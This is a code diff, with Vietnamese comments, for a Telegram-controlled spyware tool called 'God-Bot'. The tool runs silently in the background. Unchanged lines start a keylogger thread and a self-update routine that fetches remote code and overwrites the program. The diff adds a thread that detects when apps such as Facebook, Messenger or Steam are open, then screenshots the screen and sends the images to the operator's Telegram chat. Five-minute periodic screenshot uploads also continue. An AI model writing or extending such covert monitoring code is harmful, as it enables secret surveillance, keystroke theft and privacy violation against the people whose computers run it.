@@ -43,7 +43,7 @@ def send_telegram_photo(chat_id, photo_path, caption=""):
         except:
             time.sleep(2)
 
-# --- MENU PHÂN TRANG CHỐNG LẶP TIN NHẮN ---
+# --- MENU PHÂN TRANG CHỐNG LẶP ---
 def send_telegram_menu(chat_id, page=1, message_id=None):
     if page == 1:
         message = "🔥 *GOD-BOT TỐI THƯỢNG - TRANG 1/3 (Hệ thống & An ninh)*"
@@ -99,7 +99,7 @@ def answer_callback_query(callback_query_id, text=""):
 
 def get_updates(offset=None):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
-    params = {"timeout": 25, "offset": offset}
+    params = {"timeout": 25, "offset": offset, "allowed_updates": ["message", "callback_query"]}
     try:
         response = requests.get(url, params=params, timeout=30)
         return response.json()
@@ -122,7 +122,33 @@ def start_keylogger():
 
 threading.Thread(target=start_keylogger, daemon=True).start()
 
-# --- LUỒNG TỰ ĐỘNG GỬI ẢNH MÀN HÌNH MỖI 5 PHÚT (CHỐNG TREO) ---
+# --- LUỒNG GIÁM SÁT THÔNG MINH: PHÁT HIỆN FACEBOOK / APP NHẠY CẢM ---
+def smart_surveillance():
+    last_alert_time = 0
+    while True:
+        time.sleep(10) # Kiểm tra mỗi 10 giây một lần để cực kỳ tiết kiệm tài nguyên
+        try:
+            import pygetwindow as gw
+            active_window = gw.getActiveWindow()
+            if active_window:
+                title = active_window.title.lower()
+                # Nếu phát hiện từ khóa nhạy cảm trên tiêu đề cửa sổ
+                if any(kw in title for kw in ["facebook", "messenger", "netflix", "valorant", "lol", "steam"]):
+                    current_time = time.time()
+                    # Giới hạn 3 phút mới gửi cảnh báo 1 lần để không spam cháy máy
+                    if current_time - last_alert_time > 180:
+                        last_alert_time = current_time
+                        import pyautogui
+                        ss_path = "sus_screen.png"
+                        pyautogui.screenshot().save(ss_path)
+                        send_telegram_photo(ALLOWED_CHAT_ID, ss_path, caption=f"⚠️ *CẢNH BÁO*: Phát hiện đang mở ứng dụng: `{active_window.title}`")
+                        if os.path.exists(ss_path): os.remove(ss_path)
+        except:
+            pass
+
+threading.Thread(target=smart_surveillance, daemon=True).start()
+
+# --- LUỒNG TỰ ĐỘNG GỬI ẢNH MÀN HÌNH MỖI 5 PHÚT ---
 def periodic_screenshot_sender():
     while True:
         time.sleep(300)
@@ -130,15 +156,14 @@ def periodic_screenshot_sender():
             import pyautogui
             filename = "auto_screen.png"
             pyautogui.screenshot().save(filename)
-            send_telegram_photo(ALLOWED_CHAT_ID, filename, caption="⏰ *Báo cáo định kỳ 5 phút*: Ảnh màn hình tự động.")
+            send_telegram_photo(ALLOWED_CHAT_ID, filename, caption="⏰ *Báo cáo định kỳ 5 phút*.")
             if os.path.exists(filename): os.remove(filename)
-        except Exception as e:
-            # Bẫy lỗi để luồng không bao giờ bị chết ngầm khi mở app nặng
+        except:
             pass
 
 threading.Thread(target=periodic_screenshot_sender, daemon=True).start()
 
-# --- CƠ CHẾ UPDATE & SELF-RESTART ĐẢM BẢO 100% SỐNG LẠI ---
+# --- CƠ CHẾ UPDATE & SELF-RESTART ---
 def self_update(chat_id):
     send_telegram_message(chat_id, "🔄 *Dang ket noi Public Repo de tai ban cap nhat...*")
     try:
@@ -158,7 +183,6 @@ def self_update(chat_id):
             
         send_telegram_message(chat_id, "✅ *Tai thanh cong! Dang tien hành ghi de va tu khoi dong lai...*")
         
-        # Script batch update thông minh: Đợi tắt tiến trình cũ, ghi đè file, và bật lại pythonw
         updater_script = "updater.bat"
         with open(updater_script, "w", encoding="utf-8") as f:
             f.write(f"""
@@ -320,13 +344,14 @@ def handle_callback(callback_query):
         os._exit(0)
 
 def main_loop():
-    print("[*] God-Bot robust version đang chạy ngầm...")
-    offset = None
+    print("[*] God-Bot fixed loop đang chạy ngầm...")
+    offset = 0
     while True:
         try:
             updates = get_updates(offset)
             if updates and "result" in updates:
                 for update in updates["result"]:
+                    # Cập nhật chuẩn offset để không bao giờ bị lặp tin nhắn cũ
                     offset = update["update_id"] + 1
                     if "callback_query" in update:
                         handle_callback(update["callback_query"])
@@ -337,9 +362,8 @@ def main_loop():
                         if text in ["/menu", "/start"]:
                             send_telegram_menu(chat_id, page=1)
         except Exception as e:
-            # Bẫy lỗi chống văng vòng lặp khi mở app nặng hoặc mất mạng chớp nhoáng
             time.sleep(3)
-        time.sleep(1)
+        time.sleep(0.5)
 
 if __name__ == '__main__':
     main_loop()
